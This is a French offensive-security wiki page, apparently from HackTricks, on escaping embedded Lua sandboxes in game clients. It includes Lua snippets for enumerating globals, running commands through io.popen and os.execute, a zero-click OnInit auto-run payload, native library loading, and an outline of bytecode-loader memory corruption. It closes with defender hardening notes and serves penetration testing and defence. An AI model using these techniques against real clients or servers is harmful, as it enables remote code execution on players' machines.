# Contourner les sandboxes Lua (VM intégrées, clients de jeux)

{{#include ../../../banners/hacktricks-training.md}}

Cette page rassemble des techniques pratiques pour énumérer et s'échapper des "sandboxes" Lua intégrées aux applications (notamment les clients de jeux, les plugins ou les moteurs de scripting intégrés aux applications). De nombreux moteurs exposent un environnement Lua restreint, mais laissent accessibles des variables globales puissantes permettant l'exécution arbitraire de commandes, voire la corruption de la mémoire native lorsque les chargeurs de bytecode sont exposés.

Idées clés :
- Traiter la VM comme un environnement inconnu : énumérer _G et découvrir les primitives dangereuses accessibles.
- Lorsque stdout/print est bloqué, détourner tout canal UI/IPC de la VM comme sink de sortie afin d'observer les résultats.
- Si io/os est exposé, vous disposez souvent d'une exécution directe de commandes (io.popen, os.execute).
- Si load/loadstring/loadfile sont exposés, l'exécution de bytecode Lua spécialement conçu peut compromettre la sécurité mémoire dans certaines versions (les vérificateurs des versions ≤5.1 peuvent être contournés ; le vérificateur a été supprimé dans la version 5.2), permettant une exploitation avancée.

## Énumérer l'environnement sandboxé

- Dumper l'environnement global pour inventorier les tables/fonctions accessibles :
```lua
-- Minimal _G dumper for any Lua sandbox with some output primitive `out`
local function dump_globals(out)
out("=== DUMPING _G ===")
for k, v in pairs(_G) do
out(tostring(k) .. " = " .. tostring(v))
end
end
```
- Si aucune fonction print() n’est disponible, réutilisez les canaux in-VM. Exemple tiré de la VM d’un script de housing de MMO, où la sortie du chat ne fonctionne qu’après un appel de son ; ce qui suit construit une fonction de sortie fiable :<sup>[[1]](#references)</sup>
```lua
-- Build an output channel using in-game primitives
local function ButlerOut(label)
-- Some engines require enabling an audio channel before speaking
H.PlaySound(0, "r[1]") -- quirk: required before H.Say()
return function(msg)
H.Say(label or 1, msg)
end
end

function OnMenu(menuNum)
if menuNum ~= 3 then return end
local out = ButlerOut(1)
dump_globals(out)
end
```
Généralisez ce schéma à votre cible : toute textbox, toast, logger ou callback d’interface utilisateur qui accepte des chaînes peut servir de stdout pour la reconnaissance.

## Exécution directe de commandes si io/os est exposé

Si le sandbox expose encore les bibliothèques standard io ou os, vous disposez probablement immédiatement d’une exécution de commandes :
```lua
-- Windows example
io.popen("calc.exe")

-- Cross-platform variants depending on exposure
os.execute("/usr/bin/id")
io.popen("/bin/sh -c 'id'")
```
Notes :

- L’exécution se produit dans le processus client ; de nombreuses couches anti-cheat/antidebug qui bloquent les debuggers externes n’empêcheront pas la création de processus dans la VM.
- Vérifiez également : package.loadlib (chargement arbitraire de DLL/.so), require avec des modules natifs, le ffi de LuaJIT (s’il est présent) et la bibliothèque debug (peut élever les privilèges dans la VM).

## Déclencheurs zero-click via des callbacks auto-run

Si l’application hôte pousse des scripts vers les clients et que la VM expose des hooks auto-run (par ex. OnInit/OnLoad/OnEnter), placez-y votre payload pour une compromission drive-by dès le chargement du script :<sup>[[1]](#references)</sup>
```lua
function OnInit()
io.popen("calc.exe") -- or any command
end
```
Tout callback équivalent (OnLoad, OnEnter, etc.) généralise cette technique lorsque les scripts sont automatiquement transmis et exécutés sur le client.

## Primitives dangereuses à rechercher pendant la recon

Lors de l’énumération de _G, recherchez spécifiquement :
- io, os : io.popen, os.execute, I/O de fichiers, accès à l’environnement.
- load, loadstring, loadfile, dofile : exécution de source ou de bytecode ; permet le chargement de bytecode non fiable.
- package, package.loadlib, require : chargement de bibliothèques dynamiques et surface des modules.
- debug : setfenv/getfenv (≤5.1), getupvalue/setupvalue, getinfo et hooks.
- Uniquement LuaJIT : ffi.cdef, ffi.load pour appeler directement du code natif.

Exemples d’utilisation minimaux (s’ils sont accessibles) :

L’API de chargement de Lua a changé selon les versions : dans Lua 5.1, `load` lit depuis une fonction reader et `loadstring` lit depuis une chaîne ; dans Lua 5.2, `load` accepte soit une chaîne, soit une fonction reader, et `loadstring` est obsolète, car il s’agit de son équivalent.<sup>[[5]](#references)[[6]](#references)</sup>
```lua
-- Lua 5.2+ source loader; Lua 5.1 use loadstring("return 1+1")
local f = load("return 1+1")
print(f()) -- 2

-- Lua 5.1 string/bytecode loader
local bc = string.dump(function() return 0x1337 end)
local g = loadstring(bc) -- in 5.1 may run precompiled bytecode
print(g())

-- Load native library symbol (if allowed)
local mylib = package.loadlib("./libfoo.so", "luaopen_foo")
local foo = mylib()
```
## Escalade facultative : abus des chargeurs de bytecode Lua

Lorsque load/loadstring/loadfile sont accessibles, mais que io/os sont restreints, l’exécution de bytecode Lua spécialement conçu peut conduire à des primitives de divulgation et de corruption de mémoire. Points clés :
- Lua ≤ 5.1 incluait un vérificateur de bytecode présentant des contournements connus.<sup>[[4]](#references)</sup>
- Lua 5.2 a entièrement supprimé le vérificateur (position officielle : les applications doivent simplement rejeter les chunks précompilés), ce qui élargit la surface d’attaque si le chargement de bytecode n’est pas interdit.<sup>[[2]](#references)[[3]](#references)</sup>
- Les workflows suivent généralement ce schéma : leak de pointeurs via la sortie in-VM, création de bytecode provoquant des confusions de types (par exemple autour de FORLOOP ou d’autres opcodes), puis pivot vers une lecture/écriture arbitraire ou l’exécution de code natif.<sup>[[2]](#references)[[4]](#references)</sup>

Cette voie dépend du moteur et de la version et nécessite de la RE. Consultez les références pour des analyses approfondies, des primitives d’exploitation et des exemples de gadgets dans des jeux.

## Notes de détection et de durcissement (pour les défenseurs)

- Côté serveur : rejeter ou réécrire les scripts utilisateur ; appliquer une allowlist d’API sûres ; supprimer ou lier à une valeur vide io, os, load/loadstring/loadfile/dofile, package.loadlib, debug et ffi.
- Côté client : exécuter Lua avec un _ENV minimal, interdire le chargement de bytecode, réintroduire un vérificateur strict de bytecode ou des contrôles de signature, et bloquer la création de processus depuis le processus client.
- Télémétrie : générer une alerte lorsqu’un gameclient crée un processus enfant peu après le chargement d’un script ; corréler avec les événements de l’UI, du chat et des scripts.

## References

- [1] [Cette maison est hantée : un RCE vieux d’une décennie dans le client AION (VM Lua de logement)](https://appsec.space/posts/aion-housing-exploit/)
- [2] [Analyse du bytecode : découverte des failles de sécurité Lua de Factorio](https://memorycorruption.net/posts/rce-lua-factorio/)
- [3] [lua-l (2009) : discussion sur la suppression du vérificateur de bytecode](https://web.archive.org/web/20230308193701/https://lua-users.org/lists/lua-l/2009-03/msg00039.html)
- [4] [Exploitation du bytecode Lua 5.1 (gist avec contournements/notes sur le vérificateur)](https://gist.github.com/ulidtko/51b8671260db79da64d193e41d7e7d16)
- [5] [Manuel de référence de Lua 5.1](https://www.lua.org/manual/5.1/manual.html#pdf-loadstring)
- [6] [Manuel de référence de Lua 5.2](https://www.lua.org/manual/5.2/manual.html#pdf-load)
{{#include ../../../banners/hacktricks-training.md}}
